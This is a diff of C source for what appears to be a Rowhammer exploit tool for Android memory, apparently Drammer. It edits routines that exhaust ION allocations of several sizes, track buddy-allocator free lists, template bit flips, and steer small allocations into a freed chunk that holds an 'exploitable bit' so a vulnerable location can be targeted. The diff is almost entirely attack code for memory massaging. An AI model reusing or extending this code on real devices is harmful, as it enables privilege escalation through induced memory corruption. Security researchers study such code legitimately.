@@ -76,10 +76,10 @@ int main(int argc, char *argv[]) {
     // } else {
     //     printf("Success.\n");
     // }
-    printf("______   ______ _______ _______ _______ _______  ______  \n");
-    printf("|     \\ |_____/ |_____| |  |  | |  |  | |______ |_____/ \n");
-    printf("|_____/ |    \\_ |     | |  |  | |  |  | |______ |    \\_\n");
-    printf("\n");
+//    printf("______   ______ _______ _______ _______ _______  ______  \n");
+//    printf("|     \\ |_____/ |_____| |  |  | |  |  | |______ |_____/ \n");
+//    printf("|_____/ |    \\_ |     | |  |  | |  |  | |______ |    \\_\n");
+//    printf("\n");
 
     int c;
     int timer = 0;
@@ -149,33 +149,21 @@ int main(int argc, char *argv[]) {
         uint8_t *start = (uint8_t *)0x14000000;
         uint8_t *p = start;
         uint32_t interval = M(2);
-        uint32_t length = K(64);
-        uint32_t count = 512;
-        uint32_t free_before[11], free_after[11];
-        get_maps_info();
+        uint32_t length = K(4);
+        uint32_t count = 128*4;
+        uint32_t free_before[11], free_mid[11], free_after[11];
+//        get_maps_info();
         get_buddy_info("Normal", free_before);
 //        get_status_info("VmPTE");
         for (uint32_t i = 0; i < count; i++) {
             mmap(p, length, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-//            for (uint32_t j = 0; j < length / K(4); j++) {
-//                uint32_t *q = (uint32_t *)p;
-//                *q = 0xFFFFFFFF;
-//                q += K(4);
-//            }
             uint8_t *q = p;
-//            for (int j = 0; j < length / K(4); j++) {
-                *q = 0xFF;
-//                q += K(4);
-//            }
+            *q = 0xFF;
             p = p + interval;
-//            printf("%3d: ", i);
 //            get_buddy_info("Normal");
 //            get_status_info("VmPTE");
-//            putchar('\n');
         }
-//        sleep(1);
-//        get_maps_info();
-        get_buddy_info("Normal");
+        get_buddy_info("Normal", free_mid);
 //        get_status_info("VmPTE");
 
         p = start;
@@ -184,16 +172,19 @@ int main(int argc, char *argv[]) {
             p = p + interval;
         }
 
-//        sleep(1);
+//        get_maps_info();
         get_buddy_info("Normal", free_after);
 //        get_status_info("VmPTE");
-//        get_maps_info();
 
-        int dif = 0;
+        int dif_mid = 0, dif_after = 0;
         for (uint32_t i = 0; i < 11; i++) {
-            dif = dif + (((int)free_after[i] - (int)free_before[i]) << i);
+            dif_mid = dif_mid + (((int)free_mid[i] - (int)free_before[i]) << i);
         }
-        printf("Page count differences: %d\n", dif);
+        for (uint32_t i = 0; i < 11; i++) {
+            dif_after = dif_after + (((int)free_after[i] - (int)free_before[i]) << i);
+        }
+        printf("Page count differences between start and mid: %d\n", dif_mid);
+        printf("Page count differences between start and end: %d\n", dif_after);
 
         helper_clean();
         return 0;
@@ -316,13 +307,11 @@ int main(int argc, char *argv[]) {
             break;
         } else {
             get_buddy_info();
-            get_pagetype_info();
             // Exhaust L
             printf("[MAIN] Exhaust L (4MB) ION chunks for templating\n");
             int count = ION_bulk(M(4), ion_chunks, 0);
             print("[EXHAUST] %d L (4MB) ION chunks allocated \n", count);
             get_buddy_info();
-            get_pagetype_info();
 
             // Template L
             TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);
@@ -339,7 +328,6 @@ int main(int argc, char *argv[]) {
             count = ION_bulk(K(64), ion_chunks, 0, false);
             print("[EXHAUST] %d M (64KB) ION chunks allocated \n", count);
             get_buddy_info();
-            get_pagetype_info();
 
             // Free L* with particular exploitable bit
             print("[MAIN] Free L* at va %p\n", first_expl->ion_chunk->mapping);
@@ -386,11 +374,9 @@ int main(int argc, char *argv[]) {
             }
 
             // Allocate S until S start to land in M*
-
             // 0  1  2   3   4   5    6    7    8  9  10
             // 4K 8K 16K 32K 64k 128K 256K 512K 1M 2M 4M
             uint32_t free[11];
-            uint32_t i = 0;
             get_buddy_info("Normal", free);
             if (free[4] != 1) {
                 printf("[MAIN] More than one 64K holes\n");
@@ -400,14 +386,15 @@ int main(int argc, char *argv[]) {
                 count = ION_bulk(K(4), ion_chunks, 1, false);
                 if (count == 0) break;
 
-                if (i % 16 == 0) get_pagetype_info();
                 get_buddy_info("Normal", free);
                 if (free[4] != 1) {
                     printf("[EXHAUST] Meet 64K hole\n");
                     break;
                 }
-                i++;
             }
+
+            // Allocate padding S until the next place will be vulnerable
+
             break;
         }
     } while(true);
